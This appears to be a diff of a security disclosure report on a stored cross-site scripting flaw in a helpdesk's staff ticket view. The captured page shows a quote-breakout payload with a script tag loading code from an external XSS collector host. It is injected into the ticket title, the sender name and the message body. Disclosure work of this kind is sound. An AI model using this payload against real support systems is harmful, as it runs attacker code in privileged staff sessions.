@@ -28,70 +28,8 @@ When a staff member or administrator reviews submitted support tickets within th
 ### Vulnerable DOM Snippet
 
 ```html
-<html>
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>'"&gt;&lt;scriPt src=[https://xss.report/c/vansh&gt;&lt;/scriPt&gt](https://xss.report/c/vansh&gt;&lt;/scriPt&gt);</title>
-    <link rel="stylesheet" href="../assets/style.css">
-  </head>
-  <body class="staff">
-    <aside class="staffside">
-      <a class="logo" href="../index.php"><span>desk</span>flow</a>
-      <a class="sideactive" href="index.php">Inbox</a>
-      <a href="articles.php">Knowledge base</a>
-      <a href="../index.php">View portal</a>
-      <a href="logout.php">Sign out</a>
-    </aside>
-    <main class="staffmain detailstaff">
-      <a class="back" href="index.php">← Inbox</a>
-      <div class="split">
-        <section class="conversation">
-          <small>DF-3075E696</small>
-          <h1>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></h1>
-          <div class="person">
-            <div class="initial">'</div>
-            <div>
-              <b>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></b>
-              <span>asd@gmail.com · Account</span>
-            </div>
-          </div>
-          <div class="msg">
-            <p>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></p>
-            <small>Nov 9, 2026 02:18</small>
-          </div>
-        </section>
-        <aside class="ticketpanel">
-          <small>UPDATE TICKET</small>
-          <form method="post" action="update.php">
-            <input type="hidden" name="csrf" value="145015c71ce9a14960dfd339d5d0f65c2994fd42cc45cfd5">
-            <input type="hidden" name="id" value="5">
-            <label>Status
-              <select name="status">
-                <option selected="">open</option>
-                <option>pending</option>
-                <option>solved</option>
-                <option>closed</option>
-              </select>
-            </label>
-            <label>Priority
-              <select name="priority">
-                <option>low</option>
-                <option selected="">normal</option>
-                <option>high</option>
-                <option>urgent</option>
-              </select>
-            </label>
-            <label>Reply to customer
-              <textarea name="reply" rows="8" placeholder="Write a helpful response..."></textarea>
-            </label>
-            <button>Save &amp; update</button>
-          </form>
-        </aside>
-      </div>
-    </main>
-  </body>
-</html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'"&gt;&lt;scriPt src=https://xss.report/c/vansh&gt;&lt;/scriPt&gt;</title><link rel="stylesheet" href="../assets/style.css"></head><body class="staff"><aside class="staffside"><a class="logo" href="../index.php"><span>desk</span>flow</a><a class="sideactive" href="index.php">Inbox</a><a href="articles.php">Knowledge base</a><a href="../index.php">View portal</a><a href="logout.php">Sign out</a></aside><main class="staffmain detailstaff"><a class="back" href="index.php">← Inbox</a><div class="split"><section class="conversation"><small>DF-3075E696</small><h1>'"&gt;<script src="https://xss.report/c/vansh"></script></h1><div class="person"><div class="initial">'</div><div><b>'"&gt;<script src="https://xss.report/c/vansh"></script></b><span>asd@gmail.com · Account</span></div></div><div class="msg"><p>'"&gt;<script src="https://xss.report/c/vansh"></script></p><small>Nov 9, 2026 02:18</small></div></section><aside class="ticketpanel"><small>UPDATE TICKET</small><form method="post" action="update.php"><input type="hidden" name="csrf" value="145015c71ce9a14960dfd339d5d0f65c2994fd42cc45cfd5"><input type="hidden" name="id" value="5"><label>Status<select name="status"><option selected="">open</option><option>pending</option><option>solved</option><option>closed</option></select></label><label>Priority<select name="priority"><option>low</option><option selected="">normal</option><option>high</option><option>urgent</option></select></label><label>Reply to customer<textarea name="reply" rows="8" placeholder="Write a helpful response..."></textarea></label><button>Save &amp; update</button></form></aside></div></main><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;534dbc1854e3437aa1164d09110b7f47&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>
+<iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1920" height="1067" scrolling="no" data-html2canvas-ignore="true"></iframe><iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1920" height="1067" scrolling="no" data-html2canvas-ignore="true"></iframe></body></html>
 ```
 ## Impact
 Execution of arbitrary JavaScript code within the high-privilege session of a staff member or administrator reviewing stored customer tickets.
